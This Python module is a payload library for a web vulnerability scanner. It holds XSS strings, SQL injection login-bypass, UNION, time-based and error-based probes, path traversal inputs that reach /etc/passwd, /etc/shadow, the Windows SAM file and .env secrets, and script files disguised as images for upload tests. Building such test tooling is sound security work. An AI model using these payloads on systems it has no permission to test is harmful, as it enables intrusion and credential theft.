"""
Payload libraries for web vulnerability testing.
Organized by vulnerability class. All payloads are test/detection strings only —
none are exploit code, shells, or destructive payloads.
"""

from typing import List, Dict


# ---------------------------------------------------------------------------
# XSS payloads
# ---------------------------------------------------------------------------

XSS_PAYLOADS: List[Dict[str, str]] = [
    # Basic reflected
    {"name": "script_tag", "payload": "<script>alert(1)</script>", "type": "reflected"},
    {"name": "img_onerror", "payload": "<img src=x onerror=alert(1)>", "type": "reflected"},
    {"name": "svg_onload", "payload": "<svg onload=alert(1)>", "type": "reflected"},
    {"name": "body_onload", "payload": "<body onload=alert(1)>", "type": "reflected"},
    {"name": "iframe_onload", "payload": "<iframe onload=alert(1)>", "type": "reflected"},
    {"name": "input_onfocus", "payload": "<input onfocus=alert(1) autofocus>", "type": "reflected"},
    {"name": "marquee_onstart", "payload": "<marquee onstart=alert(1)>", "type": "reflected"},
    {"name": "details_open", "payload": "<details open ontoggle=alert(1)>", "type": "reflected"},
    # Event handler variants
    {"name": "img_onmouseover", "payload": "<img src=x onmouseover=alert(1)>", "type": "reflected"},
    {"name": "svg_onmouseover", "payload": "<svg onmouseover=alert(1)>", "type": "reflected"},
    {"name": "div_onclick", "payload": "<div onclick=alert(1)>click me</div>", "type": "reflected"},
    {"name": "button_onclick", "payload": "<button onclick=alert(1)>btn</button>", "type": "reflected"},
    # Encoded variants
    {"name": "html_entity_encode", "payload": "&lt;script&gt;alert(1)&lt;/script&gt;", "type": "encoded"},
    {"name": "url_encode_script", "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "type": "encoded"},
    {"name": "double_url_encode", "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E", "type": "encoded"},
    {"name": "mixed_encoding", "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "type": "evasive"},
    # Attribute context
    {"name": "attr_break_quote", "payload": '" onmouseover="alert(1)', "type": "attribute"},
    {"name": "attr_break_apos", "payload": "' onmouseover='alert(1)", "type": "attribute"},
    {"name": "attr_img_tag", "payload": '"><img src=x onerror=alert(1)>', "type": "attribute"},
    # AngularJS sandbox escape
    {"name": "angular_escape_1", "payload": "{{constructor.constructor('alert(1)')()}}", "type": "framework"},
    {"name": "angular_escape_2", "payload": "{{$eval.constructor('alert(1)')()}}", "type": "framework"},
    {"name": "angular_escape_3", "payload": "{{''.__proto__.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)')}}", "type": "framework"},
    # Markdown injection (Juice Shop has markdown issues)
    {"name": "markdown_img", "payload": "![alt](x onerror=alert(1)>)", "type": "stored"},
    # Stored XSS marker
    {"name": "stored_marker", "payload": "<script>alert('XSS-STORED-TEST')</script>", "type": "stored"},
]

XSS_INJECTION_PAYLOADS: List[Dict[str, str]] = [
    {"name": "alert_cookie", "payload": "<script>alert(document.cookie)</script>", "type": "detect"},
    {"name": "prompt_test", "payload": "<script>prompt('XSS_TEST')</script>", "type": "detect"},
    {"name": "confirm_test", "payload": "<script>confirm('XSS_TEST')</script>", "type": "detect"},
    {"name": "write_test", "payload": "<script>document.write('XSS_TEST_MARKER')</script>", "type": "detect"},
    {"name": "src_marker_img", "payload": "<img src=x onerror=\"document.body.innerHTML+='XSS_MARKER'\">", "type": "detect"},
]


# ---------------------------------------------------------------------------
# SQL injection payloads
# ---------------------------------------------------------------------------

SQLI_BYPASS_PAYLOADS: List[Dict[str, str]] = [
    {"name": "oracle_tautology", "payload": "' OR '1'='1", "dbms": "generic"},
    {"name": "oracle_tautology_comment", "payload": "' OR '1'='1' --", "dbms": "generic"},
    {"name": "oracle_tautology_hash", "payload": "' OR '1'='1' #", "dbms": "mysql"},
    {"name": "double_quote_tautology", "payload": '" OR "1"="1', "dbms": "generic"},
    {"name": "admin_comment", "payload": "admin' --", "dbms": "generic"},
    {"name": "admin_hash", "payload": "admin' #", "dbms": "mysql"},
    {"name": "sleep_or", "payload": "' OR SLEEP(5) --", "dbms": "mysql"},
    {"name": "pg_sleep_or", "payload": "' OR pg_sleep(5) --", "dbms": "postgresql"},
    {"name": "waitfor_or", "payload": "' OR WAITFOR DELAY '0:0:5' --", "dbms": "mssql"},
    {"name": "null_or", "payload": "' OR 1=1 --", "dbms": "generic"},
    {"name": "null_or_comment", "payload": "1' OR 1=1 --", "dbms": "generic"},
    {"name": "always_true", "payload": "' OR true --", "dbms": "postgresql"},
    {"name": "always_true_mssql", "payload": "' OR 1=1; --", "dbms": "mssql"},
]

SQLI_UNION_PAYLOADS: List[Dict[str, str]] = [
    {"name": "union_null_1col", "payload": "' UNION SELECT NULL --", "dbms": "generic"},
    {"name": "union_null_2col", "payload": "' UNION SELECT NULL, NULL --", "dbms": "generic"},
    {"name": "union_null_3col", "payload": "' UNION SELECT NULL, NULL, NULL --", "dbms": "generic"},
    {"name": "union_null_4col", "payload": "' UNION SELECT NULL, NULL, NULL, NULL --", "dbms": "generic"},
    {"name": "union_null_5col", "payload": "' UNION SELECT NULL, NULL, NULL, NULL, NULL --", "dbms": "generic"},
    {"name": "union_select_1", "payload": "' UNION SELECT 1 --", "dbms": "generic"},
    {"name": "union_select_1_2", "payload": "' UNION SELECT 1, 2 --", "dbms": "generic"},
    {"name": "union_select_1_2_3", "payload": "' UNION SELECT 1, 2, 3 --", "dbms": "generic"},
    {"name": "union_select_1_2_3_4", "payload": "' UNION SELECT 1, 2, 3, 4 --", "dbms": "generic"},
    {"name": "union_version_mysql", "payload": "' UNION SELECT VERSION() --", "dbms": "mysql"},
    {"name": "union_version_pg", "payload": "' UNION SELECT VERSION() --", "dbms": "postgresql"},
    {"name": "union_user_mysql", "payload": "' UNION SELECT USER() --", "dbms": "mysql"},
    {"name": "union_current_user", "payload": "' UNION SELECT CURRENT_USER --", "dbms": "generic"},
]

SQLI_TIME_PAYLOADS: List[Dict[str, str]] = [
    {"name": "mysql_sleep", "payload": "' OR SLEEP(5) --", "dbms": "mysql", "delay_sec": 5},
    {"name": "mysql_sleep_nested", "payload": "' OR (SELECT SLEEP(5)) --", "dbms": "mysql", "delay_sec": 5},
    {"name": "pg_sleep", "payload": "' OR pg_sleep(5) --", "dbms": "postgresql", "delay_sec": 5},
    {"name": "mssql_waitfor", "payload": "' OR WAITFOR DELAY '0:0:5' --", "dbms": "mssql", "delay_sec": 5},
    {"name": "oracle_dbms_lock", "payload": "' OR DBMS_LOCK.SLEEP(5) --", "dbms": "oracle", "delay_sec": 5},
    {"name": "sqlite_sleep", "payload": "' OR randomblob(10000000) --", "dbms": "sqlite", "delay_sec": 5},
    {"name": "mysql_bench", "payload": "' OR BENCHMARK(5000000, SHA1('test')) --", "dbms": "mysql", "delay_sec": 5},
]

SQLI_ERROR_PAYLOADS: List[Dict[str, str]] = [
    {"name": "mysql_group_by", "payload": "' GROUP BY column_on_non_exists --", "dbms": "mysql"},
    {"name": "mysql_extractvalue", "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --", "dbms": "mysql"},
    {"name": "mysql_updatexml", "payload": "' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1) --", "dbms": "mysql"},
    {"name": "pg_cast_error", "payload": "' AND 1::int = 1 --", "dbms": "postgresql"},
    {"name": "mssql_convert", "payload": "' AND CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --", "dbms": "mssql"},
    {"name": "oracle_utl_inaddr", "payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('test') --", "dbms": "oracle"},
    {"name": "sqlite_error", "payload": "' AND 1=unicode(0x27) --", "dbms": "sqlite"},
    {"name": "generic_quote", "payload": "'", "dbms": "generic"},
    {"name": "generic_double_quote", "payload": '"', "dbms": "generic"},
    {"name": "generic_backslash", "payload": "\\", "dbms": "generic"},
    {"name": "generic_semicolon", "payload": ";", "dbms": "generic"},
]

SQLI_BOOLEAN_PAYLOADS: List[Dict[str, str]] = [
    {"name": "true_condition", "payload": "' AND 1=1 --", "dbms": "generic", "condition": "true"},
    {"name": "false_condition", "payload": "' AND 1=2 --", "dbms": "generic", "condition": "false"},
    {"name": "true_version_mysql", "payload": "' AND (SELECT LENGTH(VERSION())) > 0 --", "dbms": "mysql", "condition": "true"},
    {"name": "false_version_mysql", "payload": "' AND (SELECT LENGTH(VERSION())) < 0 --", "dbms": "mysql", "condition": "false"},
    {"name": "true_pg", "payload": "' AND 1=1 --", "dbms": "postgresql", "condition": "true"},
    {"name": "false_pg", "payload": "' AND 1=2 --", "dbms": "postgresql", "condition": "false"},
    {"name": "true_mssql", "payload": "' AND 1=1 --", "dbms": "mssql", "condition": "true"},
    {"name": "false_mssql", "payload": "' AND 1=2 --", "dbms": "mssql", "condition": "false"},
]


# ---------------------------------------------------------------------------
# Path traversal payloads
# ---------------------------------------------------------------------------

PATH_TRAVERSAL_PAYLOADS: List[Dict[str, str]] = [
    {"name": "traversal_passwd", "payload": "../../../etc/passwd", "target_os": "linux"},
    {"name": "traversal_passwd_2", "payload": "../../../../etc/passwd", "target_os": "linux"},
    {"name": "traversal_passwd_3", "payload": "../../../../../etc/passwd", "target_os": "linux"},
    {"name": "traversal_shadow", "payload": "../../../etc/shadow", "target_os": "linux"},
    {"name": "traversal_win_ini", "payload": "..\\..\\..\\windows\\win.ini", "target_os": "windows"},
    {"name": "traversal_win_system", "payload": "..\\..\\..\\windows\\system32\\config\\sam", "target_os": "windows"},
    {"name": "encoded_traversal_passwd", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "target_os": "linux"},
    {"name": "encoded_traversal_single", "payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "target_os": "linux"},
    {"name": "double_encoded", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "target_os": "linux"},
    {"name": "absolute_passwd", "payload": "/etc/passwd", "target_os": "linux"},
    {"name": "absolute_win_ini", "payload": "C:\\windows\\win.ini", "target_os": "windows"},
    {"name": "null_byte_passwd", "payload": "../../../etc/passwd%00.jpg", "target_os": "linux"},
    {"name": "null_byte_win", "payload": "..\\..\\..\\windows\\win.ini%00.jpg", "target_os": "windows"},
    {"name": "double_dot_slash", "payload": "....//....//....//etc/passwd", "target_os": "linux"},
    {"name": "dot_dot_semicolon", "payload": "..;/..;/..;/etc/passwd", "target_os": "linux"},
    {"name": "url_encoded_slash", "payload": "..%2F..%2F..%2Fetc%2Fpasswd", "target_os": "linux"},
    {"name": "traversal_htpasswd", "payload": "../../../etc/apache2/.htpasswd", "target_os": "linux"},
    {"name": "traversal_proc_self", "payload": "../../../proc/self/environ", "target_os": "linux"},
    {"name": "traversal_app_config", "payload": "../../../config.json", "target_os": "generic"},
    {"name": "traversal_env", "payload": "../../../.env", "target_os": "generic"},
    {"name": "traversal_web_config", "payload": "../../../web.config", "target_os": "windows"},
]

PATH_TRAVERSAL_SIGNATURES: Dict[str, List[str]] = {
    "/etc/passwd": ["root:x:0:0:", "bin:x:1:1:", "daemon:x:2:2:"],
    "/etc/shadow": ["root:$", "nobody:$"],
    "win.ini": ["[fonts]", "[extensions]", "[files]"],
    ".htpasswd": [":"],
    ".env": ["DB_", "PASSWORD", "SECRET", "API_KEY"],
    "config.json": ['{"', '"key":', '"secret"'],
}


# ---------------------------------------------------------------------------
# File upload payloads
# ---------------------------------------------------------------------------

FILE_UPLOAD_TESTS: List[Dict[str, str]] = [
    {"name": "php_direct", "filename": "test.php",
     "content": "<?php echo 'UPLOAD_TEST_PHP'; ?>", "content_type": "application/x-php"},
    {"name": "php_double_ext", "filename": "test.php.jpg",
     "content": "<?php echo 'UPLOAD_TEST_PHP_JPG'; ?>", "content_type": "image/jpeg"},
    {"name": "php_double_ext_rev", "filename": "test.jpg.php",
     "content": "<?php echo 'UPLOAD_TEST_JPG_PHP'; ?>", "content_type": "image/jpeg"},
    {"name": "php_case_upper", "filename": "test.PHP",
     "content": "<?php echo 'UPLOAD_TEST_PHP_UPPER'; ?>", "content_type": "application/x-php"},
    {"name": "php_case_mixed", "filename": "test.Php",
     "content": "<?php echo 'UPLOAD_TEST_PHP_MIXED'; ?>", "content_type": "application/x-php"},
    {"name": "php_case_lower_ext", "filename": "test.php5",
     "content": "<?php echo 'UPLOAD_TEST_PHP5'; ?>", "content_type": "application/x-php"},
    {"name": "php_case_lower_ext2", "filename": "test.phtml",
     "content": "<?php echo 'UPLOAD_TEST_PHTML'; ?>", "content_type": "application/x-php"},
    {"name": "asp_direct", "filename": "test.asp",
     "content": "<% Response.Write('UPLOAD_TEST_ASP') %>", "content_type": "application/x-asp"},
    {"name": "aspx_direct", "filename": "test.aspx",
     "content": "<% Response.Write('UPLOAD_TEST_ASPX') %>", "content_type": "application/x-aspx"},
    {"name": "jsp_direct", "filename": "test.jsp",
     "content": '<% out.println("UPLOAD_TEST_JSP"); %>', "content_type": "application/x-jsp"},
    {"name": "exe_direct", "filename": "test.exe",
     "content": "MZ_test_exe_placeholder", "content_type": "application/x-msdownload"},
    {"name": "sh_direct", "filename": "test.sh",
     "content": "#!/bin/bash\necho UPLOAD_TEST_SH", "content_type": "application/x-sh"},
    {"name": "py_direct", "filename": "test.py",
     "content": "#!/usr/bin/env python3\nprint('UPLOAD_TEST_PY')", "content_type": "text/x-python"},
    {"name": "php_as_image", "filename": "test.jpg",
     "content": "<?php echo 'UPLOAD_TEST_AS_IMAGE'; ?>", "content_type": "image/jpeg"},
    {"name": "php_as_text", "filename": "test.txt",
     "content": "<?php echo 'UPLOAD_TEST_AS_TEXT'; ?>", "content_type": "text/plain"},
    {"name": "php_as_gif", "filename": "test.gif",
     "content": "GIF89a\n<?php echo 'UPLOAD_TEST_AS_GIF'; ?>", "content_type": "image/gif"},
    {"name": "php_as_png_header", "filename": "test.png",
     "content": "IHDR\n<?php echo 'UPLOAD_TEST_AS_PNG'; ?>", "content_type": "image/png"},
    {"name": "null_byte_php_jpg", "filename": "test.php%00.jpg",
     "content": "<?php echo 'UPLOAD_TEST_NULL_BYTE'; ?>", "content_type": "image/jpeg"},
    {"name": "svg_with_script", "filename": "test.svg",
     "content": '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
     "content_type": "image/svg+xml"},
    {"name": "safe_jpg_baseline", "filename": "test.jpg",
     "content": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c\x22\x1c\x1c\x22\x22\x22\x22\x22\x22".decode("latin-1"),
     "content_type": "image/jpeg"},
    {"name": "html_upload", "filename": "test.html",
     "content": "<html><body>UPLOAD_TEST_HTML</body></html>", "content_type": "text/html"},
    {"name": "html_with_js", "filename": "test.html",
     "content": "<html><script>alert('UPLOAD_TEST_HTML_JS')</script></html>", "content_type": "text/html"},
]


# ---------------------------------------------------------------------------
# Convenience: all payload sets by category
# ---------------------------------------------------------------------------

ALL_PAYLOAD_SETS = {
    "xss": XSS_PAYLOADS,
    "xss_injection": XSS_INJECTION_PAYLOADS,
    "sqli_bypass": SQLI_BYPASS_PAYLOADS,
    "sqli_union": SQLI_UNION_PAYLOADS,
    "sqli_time": SQLI_TIME_PAYLOADS,
    "sqli_error": SQLI_ERROR_PAYLOADS,
    "sqli_boolean": SQLI_BOOLEAN_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "file_upload": FILE_UPLOAD_TESTS,
}


def get_payloads(category: str) -> List[Dict[str, str]]:
    """Return the payload list for a given category."""
    return ALL_PAYLOAD_SETS.get(category, [])
